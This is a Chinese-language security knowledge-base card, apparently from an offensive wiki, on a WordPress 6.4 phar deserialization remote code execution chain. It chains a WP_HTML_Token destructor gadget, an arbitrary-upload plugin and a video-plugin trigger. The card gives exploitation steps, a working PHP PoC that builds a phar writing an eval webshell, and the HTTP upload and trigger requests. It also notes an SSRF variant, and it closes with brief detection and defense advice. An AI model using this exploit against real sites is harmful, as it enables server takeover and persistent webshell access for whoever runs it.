---
id: web-php-deserialization-wordpress-64-wp-html-token-phar-chain
title: WordPress 6.4 WP_HTML_Token phar 反序列化 RCE：插件任意上传 + 视频插件 is_readable 触发
type: scenario
domain: web
path: web/php/deserialization
technique: wordpress-wp-html-token-phar-gadget-chain
affected_versions: WordPress 6.4
tags:
- php
- wordpress
- phar
- deserialization
- gadget-chain
- file-upload
- ssrf
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:28:46+08:00'
  notes: 已对照原文与截图13核对：WP_HTML_Token::__destruct call_user_func gadget、GIF89A phar stub、dnd_codedropz_upload 上传 1.jpg 及序列化 payload 与卡内一致；触发路径 phar://.../1.jpg/aaa.txt 与原文一致。原文未完整给出 dl 参数与 home_url() 的拼接方式，卡内已标 confidence medium/需按目标调整；PHP<8.0 元数据反序列化条件为通识未实测。
url: /docs/web/php/deserialization/web-php-deserialization-wordpress-64-wp-html-token-phar-chain/
draft: false
kb_aliases:
- WP_HTML_Token gadget
- WordPress 6.4 反序列化链
- all-in-one-video-gallery phar
- download_video phar 触发
- WP 插件上传 phar 链
- call_user_func 析构 gadget
---

## 一句话结论

WordPress 6.4 的 `WP_HTML_Token::__destruct()` 会用可控的 `on_destroy` 与 `bookmark_name` 调用 `call_user_func()`；把该对象写进 phar metadata 并伪装成图片上传，再借 all-in-one-video-gallery 插件 `download_video` 的 `is_readable($file)` 触发 `phar://` 反序列化，即可执行任意命令（本例写入 PHP webshell）。

## 原理

- **phar 反序列化**：PHP 在通过 `phar://` 访问 phar 归档内文件时，会反序列化归档的 metadata，即使代码只是 `is_readable()`、`file_exists()`、`getimagesize()` 这类文件系统函数；只要路径可控且以 `phar://` 开头即可触发。
- **gadget**：WordPress 6.4 的 `WP_HTML_Token` 在析构时执行
  `if ( is_callable( $this->on_destroy ) ) call_user_func( $this->on_destroy, $this->bookmark_name );`
  两个属性都可从反序列化数据控制，等价于任意函数调用：`on_destroy='system'`、`bookmark_name='echo ... > shell.php'` 即可写 webshell。
- **上传入口**：drag-and-drop-multiple-file-upload-contact-form-7 插件存在任意文件上传（WPScan 收录 035dffef-4b4b-4afb-9776-7f6c5e56452c），不限制扩展名；上传时用 `GIF89A` 作为 phar stub 头（`setStub("GIF89A<?php XXX __HALT_COMPILER(); ?>")`）伪装成 jpg。
- **触发入口**：all-in-one-video-gallery 的 `download_video()` 接收 `dl` 参数，非数字时 `base64_decode`；让 `$file` 包含 `home_url()` 时 `$is_remote_file=false`，且内容不含 `http://`/`https://` 时 `$formatted_path='filepath'`，随后执行 `is_readable($file)`——传 `phar://` 路径即触发反序列化。
- **成立条件**：PHP 版本允许 phar metadata 反序列化（PHP 8 起 phar 元数据不再自动反序列化，需目标运行 PHP < 8.0 或仍存在可触发的 phar 解析路径）；WordPress 6.4 含 WP_HTML_Token 类；两个插件均已安装启用。

## 触发条件

- WordPress 6.4（含 `WP_HTML_Token`）；
- 存在任意文件上传入口，可将 phar（图片头伪装）落到 Web 目录；
- 存在可控的 `phar://` 文件操作触发点（本例为 all-in-one-video-gallery `download_video` 的 `dl` 参数经 `is_readable` 处理）；
- 目标 PHP 会对 phar metadata 做反序列化（PHP < 8.0 默认行为）。

## 利用步骤

1. 生成恶意 phar：metadata 为 `WP_HTML_Token` 对象，`bookmark_name` 为写 shell 的命令，`on_destroy` 为 `system`，stub 以 `GIF89A` 开头。
2. 通过存在任意上传的插件接口（本例 `dnd_codedropz_upload` 的 multipart 上传）把 phar 文件以 `.jpg` 上传到 `wp-content/uploads/...`。
3. 计算 phar 内文件路径：`phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/aaa.txt`。
4. 构造触发请求：`download_video` 的 `dl` 参数为 base64 编码的上述 phar 路径（满足包含 `home_url()` 与不含 http(s):// 的条件；原文仅给出触发路径，具体拼接方式需按目标 `home_url()` 调整）。
5. `is_readable('phar://...')` 反序列化 metadata，`WP_HTML_Token::__destruct` 调 `system('echo ... > /var/www/html/aaa.php')` 写入 webshell。
6. 访问 webshell 执行命令；CTF 中可用 `date -f` 等 GTFOBins 手法读取受限文件/flag。

## PoC

```php
<?php
class WP_HTML_Token {
    public $bookmark_name;
    public $on_destroy;
}
$a = new WP_HTML_Token();
$a->bookmark_name = "echo '<?php eval(\$_POST[1]);?>' > /var/www/html/aaa.php";
$a->on_destroy = 'system';

$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->setStub("GIF89A<?php XXX __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString('aaa.txt', 'test');
$phar->stopBuffering();
```

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
------b
Content-Disposition: form-data; name="type"

click
------b
Content-Disposition: form-data; name="upload-file"; filename="1.jpg"
Content-Type: image/jpeg

GIF89A<?php XXX __HALT_COMPILER(); ?>...phar 二进制...
------b--
```

```text
# 触发（dl = base64(phar 路径)）
GET /wp-content/plugins/all-in-one-video-gallery/video.php?dl=<base64(phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/aaa.txt)>
```

## 变体与关联

- 变体：同一 `is_readable`/`file_exists`/`getimagesize` 触发面也适用于其他 phar 链；可换用 phpggc 生成的 WordPress gadget。
- 关联：WordPress < 6.3.2 核心链 [[web-php-deserialization-wordpress-core-gadget-chain-wp-theme-hooks-dispatch]]（不同版本、不同 gadget）；phar 触发与伪装已有 [[web-php-deserialization-phar-read-uploaded-image-pop-chain]]、[[web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass]]；前缀受限时可用 [[web-php-deserialization-phar-prefix-filter-halt-compiler-rce]]。
- 关联：`download_video` 在 `$formatted_path='url'` 分支还会用 cURL 请求可控 URL，可作 SSRF 单独使用。

## 检测与防御

- 检测：上传目录出现带 `GIF89A` 头但含 phar 结构（`__HALT_COMPILER`）的文件；请求参数中出现 `phar://`、base64 解码后的 `phar://`；`WP_HTML_Token` 反序列化告警（可监控 `__PHP_Incomplete_Class`/unserialize 调用）。
- 防御：升级 WordPress 与插件；上传目录禁止 PHP 执行；生产环境禁用 `phar://` 包装器（`stream_wrapper_unregister('phar')`）；对文件操作路径做 `phar://` 前缀过滤与规范化校验。
